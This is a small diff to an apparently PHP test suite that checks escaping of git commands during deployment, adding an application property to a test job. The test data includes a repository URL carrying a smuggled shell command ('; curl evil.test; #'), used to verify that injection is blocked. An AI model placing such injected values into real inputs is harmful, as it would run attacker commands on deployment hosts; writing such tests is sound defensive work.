@@ -291,6 +291,7 @@ describe('deployment git command escaping', function () {
         $instance = $job->newInstanceWithoutConstructor();
 
         foreach ([
+            'application' => new Application,
             'customPort' => 22,
             'fullRepoUrl' => "git@example.com:org/repo.git'; curl evil.test; #",
         ] as $property => $value) {
